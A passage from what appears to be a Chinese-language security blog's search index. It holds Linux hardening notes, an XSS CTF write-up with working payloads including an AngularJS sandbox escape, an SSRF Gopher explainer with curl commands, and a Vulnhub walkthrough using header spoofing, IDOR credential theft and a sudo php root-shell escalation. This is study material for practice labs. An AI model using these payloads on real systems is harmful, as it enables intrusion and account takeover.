-I:插入规则 input:插入栈数据(访问流量) -s:源地址(访问主机IP) -p:指定协议 tcp:TCP协议 –dport:目标端口 22:22端口 -j:目标跳转 ACCEPT:允许访问 文件系统安全一切资源都为文件(包括硬件设备) 文件和目录安全确保重要目录的权限设置，限制用户访问 排查任何人都有写权限的目录 find / -xdev -type f \\( -perm -0002 -a ! -perm -1000 \\) -print find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print /:根目录 -xdev:只检查和指定目录在同一系统下的文件，避免出现其他系统的文件 -type:指定类型,f是文件，d是目录 -perm:按照文件权限查找文件 -0002:大于0002都列出来 -a:and的意思，条件并列 !:逻辑非 ( -perm -0002 -a ! -perm -1000 \\):权限大于0002，且排除1000权限 -print:打印符合条件的文件 配置默认的umask值为027 检查未授权SUID/SGID 文件目录权限 目录权限设置 chmod [-cfvR] filename 所有者和所有组设置 chown [-cfhvR] user[:group] filename demo:chown zkuan:zkuangroup /home/zkuan/config 日志分析系统日志的分类Linux日志日志的主要用途： 系统审计：记录登录系统的用户和日常行动 监测追踪：系统遭受到攻击时如何追踪溯源到攻击者 分析统计：系统的性能、错误等统计 /var/log/messagesLinux最核心的日志文件，假如某个服务没有定义日志文件，那么该服务产生的日志文件就会记录到这个文件中，每周归档一次，默认只保留5次。归档的方法都是由”/etc/logrotate.conf”来控制 /var/log/wtmp查看用户的登录、注销信息，同时记录系统的启动、重启、关机等事件。不能cat直接查看，必须用last查看 /var/log/btmp和wtmp类似，不能用cat直接查看，用lastb查看，记录用户登录无效的历史 /var/log/maillog记录邮件相关的日志 /var/log/cron记录系统定时任务相关的日志 /var/log/cpus记录cpu信息 /var/log/lastlog记录所有用户最后一次登录的时间，只能通过lastlog命令查看 /var/log/sudo.log记录使用sudo发出的命令，需要先配置/etc/sudoers中logfile=/var/log/sudo.log 日志文件分析工具logrotate支持日志的切割、压缩、清理以及邮件报警，通过crontab服务定时运行，也可用来管理自己的服务日志 使用方法： 默认配置文件路径：/etc/logrotate.conf 单次执行测试：`logrotate -f /etc/logrotate.conf 定时执行：/etc/crontab */5**\\*\\* root /sbin/logrotate /etc/logrotate.conf 五分钟执行一次","categories":[{"name":"SystemSec","slug":"SystemSec","permalink":"https://whoiszkuan.github.io/categories/SystemSec/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"},{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"}]},{"title":"N1BOOK-XSS","slug":"N1BOOK-XSS","date":"2021-11-04T08:58:37.000Z","updated":"2021-11-29T05:49:28.739Z","comments":true,"path":"2021/11/04/N1BOOK-XSS/","link":"","permalink":"https://whoiszkuan.github.io/2021/11/04/N1BOOK-XSS/","excerpt":"","text":"N1BOOK-XSS0x01直接构造payload看网页反应 &lt;script&gt;alert(/xss/)&lt;/script&gt; 0x02传入参数：username=&lt;script&gt;alert()&lt;/script&gt; 审计源代码 &lt;script type=\"text/javascript\"&gt; if(location.search == \"\"){ location.search = \"?username=xss\" } var username = '&lt;script&gt;alert(/xss/)&lt;/script&gt;'; document.getElementById('ccc').innerHTML= \"Welcome \" + escape(username); &lt;/script&gt; escape()函数对字符串进行了编码 发现&lt;script&gt;alert()&lt;/script&gt;被username用单引号包裹，尝试闭合，并将后面的单引号注释掉。 写入payload：username=';alert();// 0x03传入参数：username=&lt;script&gt;alert()&lt;/script&gt; 审计源代码： &lt;script type=\"text/javascript\"&gt; if(location.search == \"\"){ location.search = \"?username=xss\" } var username = '&lt;script&gt;alert()&lt;/script&gt;'; document.getElementById('ccc').innerHTML= \"Welcome \" + username; &lt;/script&gt; payload被包裹，尝试闭合：var username = '\\';alert();'; 单引号被转义，尝试两个单引号：'';alert();// 闭合成功：var username = '\\'';alert();//'; 还有另外一种方法写入&lt;img&gt;标签，alert()用onclick等以on开头的事件表示。 payload：&lt;img src=1 onclick=alert();&gt; on事件概览： 0x04查看源代码： &lt;script type=\"text/javascript\"&gt; var time = 10; var jumpUrl; if(getQueryVariable('jumpUrl') == false){ jumpUrl = location.href; }else{ jumpUrl = getQueryVariable('jumpUrl'); } setTimeout(jump,1000,time); function jump(time){ if(time == 0){ location.href = jumpUrl; }else{ time = time - 1 ; document.getElementById('ccc').innerHTML= `页面${time}秒后将会重定向到${escape(jumpUrl)}`; setTimeout(jump,1000,time); } } function getQueryVariable(variable) { var query = window.location.search.substring(1); var vars = query.split(\"&amp;\"); for (var i=0;i&lt;vars.length;i++) { var pair = vars[i].split(\"=\"); if(pair[0] == variable){return pair[1];} } return(false); } &lt;/script&gt; XSS 伪链接 javascript:alert(/xss/)并不会定向到其他页面，而是在当前页面执行alert(/xss/)。 windows.location属性 属性 描述 hash 设置或返回从#开始的URL（锚） host 设置或返回主机名和当前URL的端口号 hostname 设置或返回当前URL的主机名 href 设置或返回完整的URL pathname 设置或返回当前URL的路径部分 port 设置或返回当前URL的端口号 protocol 设置或返回当前URL的协议 search 设置或返回从?开始的URL（查询部分） function getQueryVariable()中的window.location.search.substring(1);表示了返回从?开始的URL jumpUrl为注入点，构造payload：http://127.0.0.1:3000/level3?jumpUrl=javascript:alert(); 注入成功。 0x05审计代码： &lt;script type=\"text/javascript\"&gt; if(getQueryVariable('autosubmit') !== false){ var autoForm = document.getElementById('autoForm'); autoForm.action = (getQueryVariable('action') == false) ? location.href : getQueryVariable('action'); autoForm.submit(); }else{ } function getQueryVariable(variable) { var query = window.location.search.substring(1); var vars = query.split(\"&amp;\"); for (var i=0;i&lt;vars.length;i++) { var pair = vars[i].split(\"=\"); if(pair[0] == variable){return pair[1];} } return(false); } &lt;/script&gt; getQueryVariable('autosubmit') !== false其中autosubmit不能为false，需要传入值使其为true；getQueryVariable('action') == false其中action不能为false。参数之间用&amp;连接。 构造payload：?autosubmit=1&amp;action=javascript:alert(/xss/) 注入成功。 0x06涉及到模板注入AngularJS沙箱逃逸。 常规插入payload&lt;script&gt;alert(/xss/)&lt;/script&gt;及各种绕过方式都无法注入 查看网页源代码 &lt;script src=\"https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js\"&gt;&lt;/script&gt; 引用了AngularJS框架。 尝试username={{2*2}} 得到返回值4，花括号中的表达式被执行了，意味着服务器允许用户在花括号中传入命令参数，可以实现模板注入攻击。 根据Wappalyzer判断，AngularJS版本为1.4.6 AngularJS 1.6 版本之前有Angular沙箱，利用沙箱逃逸技术进行XSS攻击。 AngularJS沙箱逃逸： {{ 'a'.constructor.prototype.charAt=[].join; //'a'.构造函数.原型.charAt eval('x=1}}};alert(1)//'); }} 通过覆盖原生函数charAt，可以绕过Angular表达式的沙箱且执行alert(1) 因此构造payload： ?username={{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}} 注入成功。 关于AngularJS沙箱逃逸的技术分析： https://github.com/rwinch/angularjs-escaping-expression-sandbox https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs https://xz.aliyun.com/t/4638","categories":[{"name":"WebSec","slug":"WebSec","permalink":"https://whoiszkuan.github.io/categories/WebSec/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"}]},{"title":"SSRF-Gopher","slug":"SSRF-Gopher","date":"2021-10-31T06:37:46.000Z","updated":"2021-12-02T13:08:28.173Z","comments":true,"path":"2021/10/31/SSRF-Gopher/","link":"","permalink":"https://whoiszkuan.github.io/2021/10/31/SSRF-Gopher/","excerpt":"SSRF Gopher 浅析","text":"What is Gopher?初识Gopher​ 在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。 ​ Gopher协议支持发出GET和POST请求：可以先截获GET请求包和POST请求包，再构成符合Gopher协议的请求。Gopher协议是SSRF利用中最强大的协议。 限制： 协议 PHP Java Curl Perl ASP.NET Gopher –wite-curlwrappers且php版本至少为5.3 小于JDK1.7 低版本不支持 支持 小于版本3 –wite-curlwrappers:运用curl工具打开url流 curl使用curl –version查看版本以及支持的协议 Gopher协议格式 URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流 Gopher默认端口是70 如果发起POST请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码 Gopher HTTPGopher发送HTTP数据步骤： 构造HTTP数据包 URL编码、替换回车换行为%0d%0a 发送Gopher协议 GET型HTTPGET /ssrf/base/get.php?name=zkuan HTTP/1.1 Host:192.168.1.111 URL编码后使用curl发送HTTP包： curl gopher://192.168.1.122/_GET%20/ssrf/base/get.php%3fname=zkuan%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0a POST型HTTPPOST /ssrf/base/post.php HTTP/1.1 Host:192.168.1.111 Content-Type:application/x-www-form-urlencoded Content-Length:11 name=zkuan URL编码后使用curl发送HTTP包： curl gopher://192.168.1.122/_POST%20/ssrf/base/post.php%20HTTP/1.1%0d%0aHost:192.168.1.111%0d%0aContent-Type:application/x-www-form-urlencoded%0d%0aContent-Length:11%0d%0a%0d%0aname=zkuan%0d%0a","categories":[{"name":"WebSec","slug":"WebSec","permalink":"https://whoiszkuan.github.io/categories/WebSec/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"}]},{"title":"Vulnhub Me And My Girlfriend","slug":"Vulnhub-Me-And-My-Girlfriend","date":"2021-10-01T06:07:54.000Z","updated":"2021-12-02T13:09:16.789Z","comments":true,"path":"2021/10/01/Vulnhub-Me-And-My-Girlfriend/","link":"","permalink":"https://whoiszkuan.github.io/2021/10/01/Vulnhub-Me-And-My-Girlfriend/","excerpt":"渗透测试初探，简单渗透测试流程学习及思路。","text":"Me And My Girlfriend:1渗透准备： 主机：Kali 2021.2 靶机：Vmware 靶机IP段：192.168.158.* Http信息头知识 Linux操作基础 靶机背景难易度：简单 靶机镜下载地址:https://www.vulnhub.com/entry/me-and-my-girlfriend-1,409/ 背景：This VM tells us that there are a couple of lovers namely Alice and Bob, where the couple was originally very romantic, but since Alice worked at a private company, “Ceban Corp”, something has changed from Alice’s attitude towards Bob like something is “hidden”, And Bob asks for your help to get what Alice is hiding and get full access to the company! 大致意思就是男主Bob怀疑女主Alice出轨了，让我们潜入Alice公司内部查看Alice的电脑线索。 开启靶机，扫描目标主机IP段nmap -sP 192.168.158.0/24 检测出靶机IP为192.168.158.128 扫描靶机信息nmap基础用法：-A 版本检测 -O 检测OS版本 -sV 服务探测/版本信息 nmap -A -O -sV 192.168.158.128 得出靶机开放了ssh:22和http:80服务 访问80端口访问80端口发现无法正常进入网页 翻译过来意思是：只能通过本地IP访问 打开网页源代码看看有没有什么提示： 提示使用X-FORWARDED-FOR访问网页 X-Forwarded-For用来获取最初发起请求的IP 综上所述：我们需要使用X-Forwarded-For伪造一个本地IP为最初发起请求访问靶机80端口 X-Forwarded-FOR已知本地IP地址为127.0.0.1 使用X-Forwarded-For Header伪造IP 成功登录 页面有4个选项，分别为 主页、登录、注册、关于。 先随便注册一个帐号登录 Login登录进去之后对我们最有用的是Profile选项 这是一个更改密码的选项 在网址栏上发现了一点端倪 ?后面跟随的是参数page=profile&amp;user_id=12，请求了profile页面，用户id为12 尝试修改Id 可以看到回显出了其他用户的帐号和密码 如果获得了帐号和密码就可以尝试登录22端口的ssh服务 那么密码该如何获得 html中设置输入文本隐藏明文的操作为type=\"password\",在审查代码中修改type类型为type=\"text\",可查看用户输入的密码。 得出用户密码。 遍历所有用户id后锁定Bob女友Alice的账户密码为alice:4lic3 SSH访问得到Alice的账户和密码后，使用ssh访问靶机电脑 ssh alice@192.168.158.128 Flag 1列出当前文件夹所有文件，包括隐藏文件 发现文件夹下有一个隐藏文件夹 进入后发现有flag1.txt文件 成功获取flag1 Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09} 提权尝试sudo su无法提权 查看Alice当前权限 (root)NOPASSWD:/usr/bin/php发现可以不使用密码打开php文件 基础提权 尝试回调php提权 CMD=\"/bin/sh\" sudo php -r \"system('$CMD');\" 成功回调root Flag 2查找flag文件 进入/root文件夹以后，发现flag2.txt文件 成功拿下flag2 Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}","categories":[{"name":"Exploit","slug":"Exploit","permalink":"https://whoiszkuan.github.io/categories/Exploit/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Penetration Testing","slug":"Penetration-Testing","permalink":"https://whoiszkuan.github.io/tags/Penetration-Testing/"}]},{"title":"Http Agreement","slug":"Http Agreement","date":"2021-09-10T11:39:28.000Z","updated":"2021-12-02T13:09:48.285Z","comments":true,"path":"2021/09/10/Http Agreement/","link":"","permalink":"https://whoiszkuan.github.io/2021/09/10/Http%20Agreement/","excerpt":"HTTP协议学习。","text":"概念服务器和客户端进行数据交互的一种形式。 常用请求头信息 User-Agent：请求载体的身份标识。 Connection：请求完毕后，是断开连接还是保持连接。 常用响应头信息 Content-Type：服务器响应回客户端的数据类型。 https协议(Hyper Text Transfer Protocol) 安全的超文本传输协议 加密方式 对称密钥加密 非对称密钥加密 证书密钥加密(https) 对称密钥加密 客户端向服务器发送一条信息，首先客户端会采用已知的算法对信息进行加密，比如MD5或者Base64加密，接收端对加密的信息进行解密的时候需要用到密钥，中间会传递密钥，（加密和解密的密钥是同一个），密钥在传输中间是被加密。 有潜在的危险，一旦被窃听，或者信息被挟持，就有可能破解密钥，而破解其中的信息。因此“共享密钥加密”这种方式存在安全隐患。 非对称密钥加密 “非对称加密”使用的时候有两把锁，一把叫做“私有密钥”，一把是“公开密钥”，使用非对象加密的加密方式的时候，服务器首先告诉客户端按照自己给定的公开密钥进行加密处理，客户端按照公开密钥加密以后，服务器接受到信息再通过自己的私有密钥进行解密。 这样做的好处就是解密的钥匙根本就不会进行传输，因此也就避免了被挟持的风险。就算公开密钥被窃听者拿到了，它也很难进行解密，因为解密过程是对离散对数求值，这可不是轻而易举就能做到的事。 缺点： 如何保证接收端向发送端发出公开秘钥的时候，发送端确保收到的是预先要发送的，而不会被挟持。只要是发送密钥，就有可能有被挟持的风险。 非对称加密的方式效率比较低，它处理起来更为复杂，通信过程中使用就有一定的效率问题而影响通信速度 证书密钥加密数字证书认证机构是客户端与服务器都可信赖的第三方机构。 传播过程： 服务器的开发者携带公开密钥，向数字证书认证机构提出公开密钥的申请，数字证书认证机构在认清申请者的身份，审核通过以后，会对开发者申请的公开密钥做数字签名，然后分配这个已签名的公开密钥，并将密钥放在证书里面，绑定在一起 服务器将这份数字证书发送给客户端，因为客户端也认可证书机构，客户端可以通过数字证书中的数字签名来验证公钥的真伪，来确保服务器传过来的公开密钥是真实的。一般情况下，证书的数字签名是很难被伪造的，这取决于认证机构的公信力。一旦确认信息无误之后，客户端就会通过公钥对报文进行加密发送，服务器接收到以后用自己的私钥进行解密。","categories":[{"name":"WebSec","slug":"WebSec","permalink":"https://whoiszkuan.github.io/categories/WebSec/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"}]},{"title":"gTile Linux split screen","slug":"gTile Linux split screen","date":"2021-08-14T07:26:29.000Z","updated":"2021-11-29T05:48:29.891Z","comments":true,"path":"2021/08/14/gTile Linux split screen/","link":"","permalink":"https://whoiszkuan.github.io/2021/08/14/gTile%20Linux%20split%20screen/","excerpt":"","text":"简介这是Gnome-Shell的一个扩展插件，由于Gnome桌面的平铺方案最多只能两个窗口，对于大屏幕显示器来说是不够用的，而gTile可以解决这个问题。 gTile拥有多个内置平铺方案，可平铺多个窗口，增加工作效率。可自行配置快捷键唤醒gTile进行平铺 安装Gnome Extensions Install先安装Gnome-Shell再安装扩展 gTile-Gnome-Shell 配置打开扩展方式：Gnome Tweak Tools(优化) –&gt; Extensions(扩展) –&gt; Gtile(点击开启按钮) 点击设置按钮进入配置界面，点击(Accelerators)选项可配置快捷键，唤醒gTile的快捷键为Super+Enter。更多快捷键请自行探索。 使用方法 Super+Enter唤醒gTile 按下键盘数字键0～9使用预设方案Super+Enter+3 还有更多预设方案可多个窗口平铺 GitHub gTile:Gtile项目地址","categories":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"}]},{"title":"About My LInux","slug":"About My LInux","date":"2021-08-12T04:02:39.000Z","updated":"2021-11-29T05:48:01.551Z","comments":true,"path":"2021/08/12/About My LInux/","link":"","permalink":"https://whoiszkuan.github.io/2021/08/12/About%20My%20LInux/","excerpt":"","text":"简言由于平时比较喜欢折腾Linux，经常会把系统反复安装，许多原先配置好的东西都忘记了,所以打算写一篇来记录一下自己平时配置的文件操作。注：本人使用的Linux系统为Kali Linux rangerranger是一款命令行文件资源管理器，提供多级视图，方便操作 sudo apt install ranger 启动命令：ranger proxychainsproxychains是一款命令行代理工具，可将当前应用的TCP转发至代理，非全局代理。目前支持Tor,HTTP,Socks代理。 git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./configuresudo make &amp;&amp; make install 代理配置文件位置：/etc/proxychains.conf启动命令：proxychains4 &lt;启动应用&gt; Vim相比Linux下的程序员都知道Vim，由于自己平时比较懒，不想学Vim的语法，所以Vim并没有自己配置，而是使用了Vim-Plus，即开即用。 git clone https://github.com/chxuan/vimplus.git ~/.vimpluscd ~/.vimplus./install.sh Vim的主题被我注释掉了，使用的主题是Terminal自带的Kali-Dark主题配色。 music-dlmusic-dl是一款基于Python3的命令行网络音乐聚合搜索下载工具。 使用pip3安装，前提需要安装pip3：sudo apt install pip3安装music-dl:sudo pip3 install pymusic-dl $ music-dl –helpUsage: music-dl [OPTIONS] Search and download music from netease, qq, kugou, baidu and xiami. Example: music-dl -k “周杰伦” Options: –version Show the version and exit. -k, –keyword TEXT 搜索关键字，歌名和歌手同时输入可以提高匹配（如 空帆船 朴树） -u, –url TEXT 通过指定的歌曲URL下载音乐 -p, –playlist TEXT 通过指定的歌单URL下载音乐 -s, –source TEXT Supported music source: qq netease kugou baidu -n, –number INTEGER Number of search results -o, –outdir TEXT Output directory -x, –proxy TEXT Proxy (e.g. http://127.0.0.1:1087) -v, –verbose Verbose mode –lyrics 同时下载歌词 –cover 同时下载封面 –nomerge 不对搜索结果列表排序和去重 –help Show this message and exit.","categories":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"}]}],"categories":[{"name":"WebSec","slug":"WebSec","permalink":"https://whoiszkuan.github.io/categories/WebSec/"},{"name":"SystemSec","slug":"SystemSec","permalink":"https://whoiszkuan.github.io/categories/SystemSec/"},{"name":"Exploit","slug":"Exploit","permalink":"https://whoiszkuan.github.io/categories/Exploit/"},{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/categories/Linux/"}],"tags":[{"name":"Security","slug":"Security","permalink":"https://whoiszkuan.github.io/tags/Security/"},{"name":"Web","slug":"Web","permalink":"https://whoiszkuan.github.io/tags/Web/"},{"name":"PHP","slug":"PHP","permalink":"https://whoiszkuan.github.io/tags/PHP/"},{"name":"Linux","slug":"Linux","permalink":"https://whoiszkuan.github.io/tags/Linux/"},{"name":"Penetration Testing","slug":"Penetration-Testing","permalink":"https://whoiszkuan.github.io/tags/Penetration-Testing/"}]}